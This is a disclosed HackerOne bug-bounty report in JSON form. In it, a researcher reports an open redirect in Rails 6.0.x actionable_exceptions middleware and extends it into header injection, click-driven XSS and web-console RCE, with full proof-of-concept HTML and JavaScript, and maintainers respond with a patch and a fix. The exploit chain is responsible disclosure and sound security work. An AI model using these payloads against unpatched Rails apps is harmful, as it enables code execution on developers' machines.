{"id":904059,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MDQwNTk=","url":"https://hackerone.com/reports/904059","title":"Open Redirect (6.0.0 \u003c rails \u003c 6.0.3.2)","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2020-06-21T02:15:14.122Z","submitted_at":"2020-06-21T02:15:14.122Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ooooooo_q","url":"/ooooooo_q","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":22,"url":"https://hackerone.com/rails","handle":"rails","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Ruby on Rails","twitter_handle":null,"website":"http://rubyonrails.org/security","about":"Web development that doesn't hurt."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2020-8264","CVE-2020-8185"],"singular_disclosure_disabled":false,"disclosed_at":"2020-12-22T16:47:02.435Z","bug_reporter_agreed_on_going_public_at":"2020-11-22T16:46:58.144Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello,\nI was looking at the change log (https://github.com/rails/rails/commit/2121b9d20b60ed503aa041ef7b926d331ed79fc2) for CVE-2020-8185 and found another problem existed.\n\nhttps://github.com/rails/rails/blob/v6.0.3.1/actionpack/lib/action_dispatch/middleware/actionable_exceptions.rb#L21\n\n```ruby\n  redirect_to request.params[:location]\nend\n\nprivate\n  def actionable_request?(request)\n    request.show_exceptions? \u0026\u0026 request.post? \u0026\u0026 request.path == endpoint\n  end\n\n  def redirect_to(location)\n    body = \"\u003chtml\u003e\u003cbody\u003eYou are being \u003ca href=\\\"#{ERB::Util.unwrapped_html_escape(location)}\\\"\u003eredirected\u003c/a\u003e.\u003c/body\u003e\u003c/html\u003e\"\n\n    [302, {\n      \"Content-Type\" =\u003e \"text/html; charset=#{Response.default_charset}\",\n      \"Content-Length\" =\u003e body.bytesize.to_s,\n      \"Location\" =\u003e location,\n    }, [body]]\n  end\n```\n\nThere was an open redirect issue because the request parameter `location` was not validated.\nIn 6.0.3.2, since the condition of `actionable_request?` has changed, this problem is less likely to occur.\n\n\n### PoC\n\n\n#### 1. Prepare server\n\nPrepare an attackable 6.0.3.1 version of Rails server\n\n```\n‚ùØ rails -v\nRails 6.0.3.1\n\n‚ùØ RAILS_ENV=production rails s\n...\n* Environment: production\n* Listening on tcp://0.0.0.0:3000\n```\n\n#### 2. Attack server \n\nPrepare the server for attack on another port.\n\n```html\n\u003cform method=\"post\" action=\"http://localhost:3000/rails/actions?error=ActiveRecord::PendingMigrationError\u0026action=Run%20pending%20migrations\u0026location=https://www.hackerone.com/\"\u003e\n\t\u003cbutton type=\"submit\"\u003eclick!\u003c/button\u003e\n\u003c/form\u003e\n````\n\n```\npython3 -m http.server 8000\n```\n\n#### 3. Open browser\n\nOpen the `http://localhost:8000/attack.html` url in your browser and click the button.\nRedirect to `https://www.hackerone.com/` url.\n\n{F876518}\n\n## Impact\n\nIt will be fixed with 6.0.3.2 as with CVE-2020-8185(https://groups.google.com/g/rubyonrails-security/c/pAe9EV8gbM0), but I think it is necessary to announce it again because the range of influence is different.\n\nThis open redirect changes from POST method to Get Method, so it may be difficult to use for phishing.On the other hand, it may affect bypass of referrer check or SSRF.","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":53,"name":"Open Redirect"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":876518,"file_name":"__________2020-06-21_10.26.21.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Ro3WSUcNhjSZthT2cTFoSsaV?response-content-disposition=attachment%3B%20filename%3D%22__________2020-06-21_10.26.21.png%22%3B%20filename%2A%3DUTF-8%27%27__________2020-06-21_10.26.21.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2T6DG5UU%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T154044Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQCyGt%2F6wKTb7WdhbTEehok3geSSNypgF1jy9glhzjfqmQIhAN%2FZ96OUsxT3l%2FcNh%2BJaiqKBQp%2B0XefuAf%2BhfC%2FmhMZBKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxZblqGtDqM2dUzvNgq1wMBRL4HwjcRdARKHRTYG1WTOwsUnNm5pyWIDl6UX7cxu3S9pxhLAGamITa%2Bry536DE0dNafGhdIyPeponbLp8FxjTVDEDmVrSlc3vq07ilX%2FsvaFMPbfLwUFwN8DcJVAZSLYZA6zDdeKNCgrZ1ISy%2BuSl%2F8sa9Nj%2FKFffdAxrEzWdcbmnUnTxt6PFvOqigHySvKHcRU1WUlzR%2BJNQhShWoYk3WMwt3lGEOyDeyEBa1PjWzXfwU5hwfOCygWSHeqe3rws%2Fy%2FAjcJ4Igs3dp7VWi2gpey9dMnBlv29eq43WYKyQ6K0q%2FC9l73EFZqlsoZAnNWCF%2BaMWp%2FSNCQCoi6LiyTT3H7xbPsVAE%2F%2B6%2B%2Fmd5o4HWlwOrPWTPapPHw%2BSF0OGtEIdy9BSNcjjpsTprmH3CxZWrOiVUBzDRDrImWT3QqtKWRETxE5UkMEesELPvS1Vr78fUKmIPG33W64ks49siCJg%2BYlvii52MslCAhwi8OBai4EvmsepnSL4Y7WjbGc31Zh7uWP1tOMXaSXgoK4ZXpbX9aNZgfinEq%2FEdjmz1acLqkVL8LTALuORrCaSQNzbL1VsrMHnDQY5Ip6UHG9W3WhTLOB2rMmAx%2FYtqF%2F2HrLRQRuA5lXPow%2F4aRiwY6pAFiuHIrJ99Gk48YedhIWLylCmpLudXTrjRTQ5%2BPJgz8sHy%2FJL%2BbYgchWh7RyeRvXCGWkecfBiAUWkHftxJlLxZP3R4oliu1hG1pnP80N0SBXLpKCFAQqqhncEnNPuXaqUaPMjKqpRRMw76WlTCCpu34SiacreJDZDO6dLymqMm3OX1OpD5Y13L2IbUTLcllZFway4EkA3FPk2PKaxAARwJYsWedpQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=505cb32667fd800b481c72d02c369c2091caf4085ddec64a8a576a70372efe41","file_size":790214,"type":"image/png"}],"allow_singular_disclosure_at":"2020-12-22T16:46:58.201Z","allow_singular_disclosure_after":-25311226.29549678,"singular_disclosure_allowed":true,"vote_count":16,"voters":["mzfr","bibekshah","ali","ahiezer","beastglatisant","ms-13","elmahdi","akashhamal0x01","zimmer75","jespert","and 6 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":{"databaseId":160,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/rails/rails","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":8359201,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I thought about it after submitting the report, but even in 6.0.3.2, `/rails/actions` is available in developer mode.\nIf it was started in development mode, the request will be accepted by CSRF, so the same as CVE-2020-8185 still exists.\nI think it's better to take CSRF measures in `/rails/actions`.\n\n#### Vulnerabilities, versions and modes\n\n- 6.0.3.1 (production, development)\n  - run pending migrations (CVE-2020-8185)\n  - open redirect\n- 6.0.3.2 (development)\n  - run pending migrations (by CSRF)\n  - open redirect (by CSRF)\n- 6.0.3.2 (production)\n  - no problem","automated_response":false,"created_at":"2020-06-21T05:55:08.833Z","updated_at":"2020-06-21T05:55:08.833Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8847934,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This seems like a good improvement, but I don't think we need to treat it as a security issue.  If you agree, would you mind filing an issue on the Rails GitHub issues?\n\nThank you!","automated_response":false,"created_at":"2020-08-04T19:23:19.013Z","updated_at":"2020-08-04T19:23:19.013Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8847940,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"","automated_response":false,"created_at":"2020-08-04T19:24:03.212Z","updated_at":"2020-08-04T19:24:03.212Z","actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8945588,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"@tenderlove \nI'm sorry to reply late.\n\nWhile researching unicorn, I found this report to lead to other vulnerabilities.\n\n### Open Redirect to HTTP header injection\n\nResponse header injection vulnerability exists in versions of puma below 4.3.2.\nhttps://github.com/puma/puma/security/advisories/GHSA-84j7-475p-hp8v\nI have confirmed that unicorn is also enable of response header injection.\n\nHTTP header injection is possible by including `\\r` in the redirect URL using these.\n\n#### PoC\n\n```js \n\u003e escape(\"\\rSet-cookie:a=a\")\n\"%0DSet-cookie%3Aa%3Da\"\n```\n\nThis is the html used on the attack server.\n\n```html\n\u003cform method=\"post\" action=\"http://localhost:3000/rails/actions?error=ActiveRecord::PendingMigrationError\u0026action=Run%20pending%20migrations\u0026location=%0DSet-cookie%3Aa%3Da\"\u003e\n  \u003cbutton type=\"submit\"\u003eset cookie\u003c/button\u003e\n\u003c/form\u003e\n```\n\nWhen click this button, the response header will be as follows.\n\n```\nLocation: \nSet-cookie: a=a\n```\n\nIf you open the developer tools in your browser, you'll see that the cookie value is set.\n\nWhen I tried it, puma and unicorn can insert only the character of `\\r`, and it seems that `\\n` cannot be inserted.\nTherefore, it seems that response body injection that leads to XSS cannot be performed.\n\nOn the other hand, in passenger, it became an error when `\\r` was in the value of the header.\n\n\n### XSS trick\n\nWhile trying out `\\r` on the response header, I noticed a strange thing.\nIf `\\r` is at the beginning, it means that the browser is not redirected and `javascript:` can be used in the URL of the response link.\nWhen specify `\\rjavascript:alert(location)` as the redirect destination, the HTML of the response will be as follows.\n\n```html\n\u003chtml\u003e\u003cbody\u003eYou are being \u003ca href=\"\njavascript:alert(location)\"\u003eredirected\u003c/a\u003e.\u003c/body\u003e\u003c/html\u003e\n```\n\nThe `\\r` character is ignored in html, so `javascript:alert(location)` is executed when the user clicks the link.\n\nThis is a separate issue from HTTP header injection and depends on how the server handles the value of `\\r`.\nIn puma and unicorn below 4.3.2, `\\r` is used for HTTP header injection, so no error occurs.\nWith puma 4.3.3 or later, if there is a line containing `\\r`, it does not become an error and it can be executed because that line is excluded. \nOn the other hand, the error occurred in passenger.\n\nAs a further issue, the headers in this response are middleware-specific and therefore do not include the security headers Rails is outputting.\nSince `X-Frame-Options` is not included, click jacking is possible.\nNo output even if CSP is set in the application.\n\nBy using click jacking in combination with these, it is easy to generate XSS that requires user click.\n\n\n#### PoC\n\nInserting the execution code from another site using the `name` of the iframe.\n\nThis PoC will also run in production mode if 6.0.0 \u003c rails \u003c 6.0.3.2.\nIt can be run with the latest puma and unicorn.\n\nIf it is development mode, it can be executed even after 6.0.3.2\n\n\n##### child.html\n\n```html\n\u003cform method=\"post\" action=\"http://localhost:3000/rails/actions?error=ActiveRecord::PendingMigrationError\u0026action=Run%20pending%20migrations\u0026location=%0Djavascript%3Aeval%28name%29\"\u003e\n\t\u003cbutton type=\"submit\"\u003elocation is escape(\"\\rjavascript:eval(name)\")\u003c/button\u003e\n\u003c/form\u003e\n\u003cscript type=\"text/javascript\"\u003e\n\tdocument.querySelector(\"button\").click();\n\u003c/script\u003e\n```\n\n##### click_jacking.html\n\n```html\n\u003chtml\u003e\n\u003cstyle\u003e\niframe{\n    position: absolute;\n    z-index: 1;\n    opacity: 0.3;\n}\ndiv{\n    position: absolute;\n    top: 20px;\n    left: 130px;\n}\nbutton {\n    width: 80px;\n    height: 26px;\n    cursor: pointer;\n}\n\u003c/style\u003e\n\u003cbody\u003e\n    \u003ciframe src=./child.html name=\"alert(location)\" height=40\u003e\u003c/iframe\u003e\n    \u003cdiv\u003e \n        \u003cbutton\u003eclick!!\u003c/button\u003e\n    \u003c/div\u003e \n\u003c/body\u003e\n\u003c/html\u003e\n```\n\n{F949988}\n{F949989}\n\n### XSS to RCE\n\nWhen XSS exists in development mode, I confirmed that calling the method of web-cosole leads to RCE.\nRCE is possible by inducing users who are developing Rails applications to click on the trap site.\n\n#### PoC\n\n```js\nvar iframe = document.createElement(\"iframe\");\niframe.src = \"/not_found\";\ndocument.body.appendChild(iframe);\nsetTimeout(()=\u003efetch(\"/__web_console/repl_sessions/\" + iframe.contentDocument.querySelector(\"#console\").dataset.sessionId, {\n    method: \"PUT\",\n    headers: {\n        \"Content-Type\": \"application/json\",\n        \"X-Requested-With\": \"XMLHttpRequest\"\n    },\n    body: JSON.stringify({\n        input: \"`touch from_web_console`\"\n    })\n}), 2000)\n```\n\n```html\n\u003ciframe src=./child.html name='var iframe = document.createElement(\"iframe\");iframe.src = \"/not_found\";document.body.appendChild(iframe);setTimeout(()=\u003e fetch(\"/__web_console/repl_sessions/\"+iframe.contentDocument.querySelector(\"#console\").dataset.sessionId, {method: \"PUT\",headers: {\"Content-Type\": \"application/json\",\"X-Requested-With\": \"XMLHttpRequest\"},body: JSON.stringify({input: \"`touch from_web_console`\"})}),2000)'/\u003e\n```\n\nWhen this is run, a file from `from_web_console` will be generated.\n\n\n---\n\n### Vulnerabilities and conditions\n\n####  Run pending migrations (CVE-2020-8185)\n\nserver: any\n\nRails version: 6.0.0 \u003c rails \u003c 6.0.3.2\nRAILS_ENV: production\n\n\n#### Run pending migrations by CSRF\n\nserver: any\n\nRails version: 6.0.0 \u003c (not fixed)\nRAILS_ENV: development\n\n\n#### Open redirect (from POST method)\n\nserver: any\n\nRails version: 6.0.0 \u003c rails \u003c 6.0.3.2\nRAILS_ENV: production\n\nor\n\nRails version: 6.0.0 \u003c (not fixed)\nRAILS_ENV: development\n\n\n#### HTTP header injection\n\nserver: unicorn (\u003c= latest) or puma (\u003c 4.3.2)\n\nRails version: 6.0.0 \u003c rails \u003c 6.0.3.2\nRAILS_ENV: production\n\nor \n\nRails version: 6.0.0 \u003c (not fixed)\nRAILS_ENV: development\n\n\n#### XSS (need user click)\n\nserver: unicorn (\u003c= latest) or puma (\u003c= latest)\n\nRailse version: 6.0.0 \u003c rails \u003c 6.0.3.2\nRAILS_ENV: production \n\nor \n\nRailse version: 6.0.0 \u003c (not fixed)\nRAILS_ENV: development\n\n\n#### RCE (from XSS)\n\nserver: unicorn (\u003c= latest) or puma (\u003c= latest)\nRailse version: 6.0.0 \u003c (not fixed)\nRAILS_ENV: development","automated_response":false,"created_at":"2020-08-15T12:39:01.561Z","updated_at":"2020-08-15T12:39:01.561Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":949989,"filename":"__________2020-08-15_21.23.22.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/McnWNtpfs7FVXQSKwpqLdF5e?response-content-disposition=attachment%3B%20filename%3D%22__________2020-08-15_21.23.22.png%22%3B%20filename%2A%3DUTF-8%27%27__________2020-08-15_21.23.22.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2T6DG5UU%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T154044Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQCyGt%2F6wKTb7WdhbTEehok3geSSNypgF1jy9glhzjfqmQIhAN%2FZ96OUsxT3l%2FcNh%2BJaiqKBQp%2B0XefuAf%2BhfC%2FmhMZBKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxZblqGtDqM2dUzvNgq1wMBRL4HwjcRdARKHRTYG1WTOwsUnNm5pyWIDl6UX7cxu3S9pxhLAGamITa%2Bry536DE0dNafGhdIyPeponbLp8FxjTVDEDmVrSlc3vq07ilX%2FsvaFMPbfLwUFwN8DcJVAZSLYZA6zDdeKNCgrZ1ISy%2BuSl%2F8sa9Nj%2FKFffdAxrEzWdcbmnUnTxt6PFvOqigHySvKHcRU1WUlzR%2BJNQhShWoYk3WMwt3lGEOyDeyEBa1PjWzXfwU5hwfOCygWSHeqe3rws%2Fy%2FAjcJ4Igs3dp7VWi2gpey9dMnBlv29eq43WYKyQ6K0q%2FC9l73EFZqlsoZAnNWCF%2BaMWp%2FSNCQCoi6LiyTT3H7xbPsVAE%2F%2B6%2B%2Fmd5o4HWlwOrPWTPapPHw%2BSF0OGtEIdy9BSNcjjpsTprmH3CxZWrOiVUBzDRDrImWT3QqtKWRETxE5UkMEesELPvS1Vr78fUKmIPG33W64ks49siCJg%2BYlvii52MslCAhwi8OBai4EvmsepnSL4Y7WjbGc31Zh7uWP1tOMXaSXgoK4ZXpbX9aNZgfinEq%2FEdjmz1acLqkVL8LTALuORrCaSQNzbL1VsrMHnDQY5Ip6UHG9W3WhTLOB2rMmAx%2FYtqF%2F2HrLRQRuA5lXPow%2F4aRiwY6pAFiuHIrJ99Gk48YedhIWLylCmpLudXTrjRTQ5%2BPJgz8sHy%2FJL%2BbYgchWh7RyeRvXCGWkecfBiAUWkHftxJlLxZP3R4oliu1hG1pnP80N0SBXLpKCFAQqqhncEnNPuXaqUaPMjKqpRRMw76WlTCCpu34SiacreJDZDO6dLymqMm3OX1OpD5Y13L2IbUTLcllZFway4EkA3FPk2PKaxAARwJYsWedpQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=8d45c6463b4e0ae58b5a2ed05a14ac5026e020b968a90052d0b05da49066511a"},{"id":949988,"filename":"__________2020-08-15_21.23.13.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/eQhM4PCpDtvnNg2PcTKDPUt2?response-content-disposition=attachment%3B%20filename%3D%22__________2020-08-15_21.23.13.png%22%3B%20filename%2A%3DUTF-8%27%27__________2020-08-15_21.23.13.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2T6DG5UU%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T154044Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQCyGt%2F6wKTb7WdhbTEehok3geSSNypgF1jy9glhzjfqmQIhAN%2FZ96OUsxT3l%2FcNh%2BJaiqKBQp%2B0XefuAf%2BhfC%2FmhMZBKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxZblqGtDqM2dUzvNgq1wMBRL4HwjcRdARKHRTYG1WTOwsUnNm5pyWIDl6UX7cxu3S9pxhLAGamITa%2Bry536DE0dNafGhdIyPeponbLp8FxjTVDEDmVrSlc3vq07ilX%2FsvaFMPbfLwUFwN8DcJVAZSLYZA6zDdeKNCgrZ1ISy%2BuSl%2F8sa9Nj%2FKFffdAxrEzWdcbmnUnTxt6PFvOqigHySvKHcRU1WUlzR%2BJNQhShWoYk3WMwt3lGEOyDeyEBa1PjWzXfwU5hwfOCygWSHeqe3rws%2Fy%2FAjcJ4Igs3dp7VWi2gpey9dMnBlv29eq43WYKyQ6K0q%2FC9l73EFZqlsoZAnNWCF%2BaMWp%2FSNCQCoi6LiyTT3H7xbPsVAE%2F%2B6%2B%2Fmd5o4HWlwOrPWTPapPHw%2BSF0OGtEIdy9BSNcjjpsTprmH3CxZWrOiVUBzDRDrImWT3QqtKWRETxE5UkMEesELPvS1Vr78fUKmIPG33W64ks49siCJg%2BYlvii52MslCAhwi8OBai4EvmsepnSL4Y7WjbGc31Zh7uWP1tOMXaSXgoK4ZXpbX9aNZgfinEq%2FEdjmz1acLqkVL8LTALuORrCaSQNzbL1VsrMHnDQY5Ip6UHG9W3WhTLOB2rMmAx%2FYtqF%2F2HrLRQRuA5lXPow%2F4aRiwY6pAFiuHIrJ99Gk48YedhIWLylCmpLudXTrjRTQ5%2BPJgz8sHy%2FJL%2BbYgchWh7RyeRvXCGWkecfBiAUWkHftxJlLxZP3R4oliu1hG1pnP80N0SBXLpKCFAQqqhncEnNPuXaqUaPMjKqpRRMw76WlTCCpu34SiacreJDZDO6dLymqMm3OX1OpD5Y13L2IbUTLcllZFway4EkA3FPk2PKaxAARwJYsWedpQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=2d80c25f4dc7e09121098383fff8119b4e336590ce29b990e7b530c0c0e5006d"}],"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9006952,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-08-22T02:16:14.347Z","updated_at":"2020-08-22T02:16:14.347Z","additional_data":{"old_severity":null,"new_severity":"High","old_severity_id":null,"new_severity_id":825532},"actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9103657,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003e When I tried it, puma and unicorn can insert only the character of \\r, and it seems that \\n cannot be inserted.\n\nMakes sense.  This seems like a security vulnerability in Puma / Unicorn.\n\n\u003e This is a separate issue from HTTP header injection and depends on how the server handles the value of \\r.\n\nI'm not sure exactly which servers are vulnerable (this is too confusing for me üòî), but whatever handles generating the response page shouldn't allow `\\r` at the beginning of the href like that.\n\nSo [this](https://github.com/rails/rails/blob/master/actionpack/lib/action_dispatch/middleware/actionable_exceptions.rb#L30) needs to check that `location` is a url (http or https).\n\nI don't think we need to set the security policy for the redirect page if we prevent the `javascript:` location from the href.\n\nHow does this patch look?\n\n```diff\ndiff --git a/actionpack/lib/action_dispatch/middleware/actionable_exceptions.rb b/actionpack/lib/action_dispatch/middleware/actionable_exceptions.rb\nindex 266fd92ce9..1593ca22d0 100644\n--- a/actionpack/lib/action_dispatch/middleware/actionable_exceptions.rb\n+++ b/actionpack/lib/action_dispatch/middleware/actionable_exceptions.rb\n@@ -1,6 +1,7 @@\n # frozen_string_literal: true\n \n require \"erb\"\n+require \"uri\"\n require \"action_dispatch/http/request\"\n require \"active_support/actionable_error\"\n \n@@ -27,7 +28,13 @@ def actionable_request?(request)\n       end\n \n       def redirect_to(location)\n-        body = \"\u003chtml\u003e\u003cbody\u003eYou are being \u003ca href=\\\"#{ERB::Util.unwrapped_html_escape(location)}\\\"\u003eredirected\u003c/a\u003e.\u003c/body\u003e\u003c/html\u003e\"\n+        uri = URI.parse location\n+\n+        if uri.relative? || uri.scheme == \"http\" || uri.scheme == \"https\"\n+          body = \"\u003chtml\u003e\u003cbody\u003eYou are being \u003ca href=\\\"#{ERB::Util.unwrapped_html_escape(location)}\\\"\u003eredirected\u003c/a\u003e.\u003c/body\u003e\u003c/html\u003e\"\n+        else\n+          return [400, {\"Content-Type\" =\u003e \"text/plain\"}, [\"Invalid redirection URI\"]]\n+        end\n \n         [302, {\n           \"Content-Type\" =\u003e \"text/html; charset=#{Response.default_charset}\",\n```\n\nI don't think we need to fix the open redirect as a security issue (maybe we can fix it on the public tracker), but this does seem like a security issue we need to fix.","automated_response":false,"created_at":"2020-09-01T19:49:12.430Z","updated_at":"2020-09-01T19:49:12.430Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9103659,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2020-09-01T19:49:38.706Z","updated_at":"2020-09-01T19:49:38.706Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9124521,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@tenderlove \nI confirmed patch. it seems there is no problem.\n\nI have confirmed that there are XSS-enabled services using a version of Rails 6.0.3.1.\nWould it be better to report XSS to the service after the patch for that fix was announced?","automated_response":false,"created_at":"2020-09-03T23:36:11.185Z","updated_at":"2020-09-03T23:36:11.185Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9462922,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @ooooooo_q,\n\nThanks again for the report. We just released a fix for this issue: https://groups.google.com/g/rubyonrails-security/c/yQzUVfv42jk. For this reason, we'll close this report as Resolved. You should expect to hear from us regarding a bounty decision within the next couple of days.","automated_response":false,"created_at":"2020-10-08T18:46:52.568Z","updated_at":"2020-10-08T18:46:52.568Z","actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"ooooooo_q","url":"/ooooooo_q"},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9625564,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @jack_mccracken,\n\nWill it still take time to decision the bounty?\n\nRegarding the contents of the release, Is it intentional that it is not disclosed that XSS is possible even in production mode below 6.0.3.2?\nIf not, I think it's better to publish the information somewhere.\nFrom the text at the time of release of 6.0.3.2, 6.0.3.3, 6.0.3.4, I think that some users will delay the release by judging that there is no significant impact.\n(Actually, there is a version of Gitlab that still uses 